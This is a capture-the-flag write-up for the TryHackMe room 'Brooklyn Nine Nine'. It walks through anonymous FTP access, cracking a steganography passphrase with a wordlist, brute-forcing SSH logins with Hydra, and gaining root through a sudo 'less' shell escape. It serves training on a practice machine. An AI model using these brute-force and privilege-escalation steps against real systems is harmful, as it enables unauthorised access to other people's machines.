# 🍦 TryHackMe — Brooklyn Nine Nine

> **Room:** [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)  
> **Difficulty:** Easy

---

## 🔍 Reconnaissance — Nmap Scan

We start, as always, with an Nmap scan against the target `10.129.138.35`:

```bash
nmap -sC -sV -oN nmap/brooklynninenine.txt 10.129.138.35
```

**Results:**

```text
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu)
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

**What we learn:**

- **Port 21 (FTP)** — vsftpd 3.0.3 with **anonymous login allowed**, and a suspicious `note_to_jake.txt` already visible.
- **Port 22 (SSH)** — a potential entry point if we can find valid credentials.
- **Port 80 (HTTP)** — a simple Apache page worth a quick look.

---

## 📂 FTP — Anonymous Access

The Nmap output already told us anonymous login is allowed. Let's connect and explore:

```bash
ftp 10.129.138.35
```

```text
Name: anonymous
Password: <empty>
```

Listing and grabbing the note:

```bash
ftp> ls
ftp> get note_to_jake.txt
ftp> bye
```

**Content of the note:**

```text
From Amy,
Jake please change your password. It is too weak and holt will be mad
if someone hacks into the nine nine
```

So there's a user **jake** with a weak password. That's a lead for a brute-force later — but first, let's check the website.

> 🔎 I also tried brute-forcing the FTP service with the `anonymous` user and found the password `abc123` — but it led nowhere. A good reminder that not every finding is a way in; keep enumerating.

---

## 🌐 HTTP — Hidden Hint in the Source Code

Browsing to the site on port 80, the page itself doesn't reveal much. But a quick look at the **page source** changes everything:

```bash
curl http://10.129.138.35
```

Hidden in an HTML comment:

```html
<!-- Have you ever heard of steganography? -->
```

The room is pointing us straight at **steganography** — and the website's images are the obvious candidates. Let's download `brooklyn99.jpg` from the page.

---

## 🖼️ Steganography — Cracking the Image

The classic tool for hiding data in JPEGs is **steghide**, but it requires a passphrase. This is where **stegcracker** comes in — a tool I discovered in this room that brute-forces steghide passphrases using a wordlist.

```bash
# Install stegcracker (if needed)
pip3 install stegcracker

# Brute-force the passphrase hidden in the image
stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

**Result:** the passphrase is **`admin`** 🎉

Now we can extract the hidden data with steghide directly:

```bash
steghide extract -sf brooklyn99.jpg -p admin
```

**Extracted content:**

```text
fluffydog12@ninenine
```

Hmm, that looks like a **password**. And remember Amy's note — **jake's password is too weak**. Time to put two and two together.

---

## 💥 Brute-forcing SSH with Hydra

Instead of guessing, let's brute-force the SSH service using the usernames we've collected (**holt**, **amy**, **jake**) and a wordlist:

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.129.138.35
```

**Results:**

```text
[22][ssh] host: 10.129.138.35   login: jake   password: 987654321
```

We now have valid SSH credentials:


| Login  | Password    |
| ------ | ----------- |
| `jake` | `987654321` |


---

## 🚩 User Flag

Let's log in:

```bash
ssh jake@10.129.138.35
```

The user flag is right there in Jake's home directory:

```bash
cat user.txt
```

**User flag:**

```text
ee11cbb19052e40b07a********
```

---

## ⬆️ Privilege Escalation — `less` to Root

Now that we have a shell, let's check what Jake can run with elevated privileges:

```bash
sudo -l
```

**Output:**

```text
User jake may run the following commands on brooklynninenine:
    (ALL) NOPASSWD: /usr/bin/less
```

Jake can run **`less`** as root without a password. Since `less` allows executing shell commands from inside, this is an instant root shell:

```bash
sudo less /etc/profile
```

Once inside `less`, type:

```text
!whoami
!/bin/bash
```

The `!` prefix makes `less` execute a command — and since it runs as **root**, spawning `/bin/bash` gives us a root shell 🎉

> 💡 **Why this works:** `less` is on the classic list of "dangerous" sudo binaries (see **GTFOBins**). Any program that can execute a shell or read arbitrary files (like `less`, `more`, `man`, `vi`) is a privilege-escalation vector if it's allowed via sudo.

---

## 🏁 Root Flag

With our root shell, we grab the final flag:

```bash
cat /root/root.txt
```

**Root flag:**

```text
63a9f0ea7bb9805079*******
```

Box completed — **GG!** 🎉
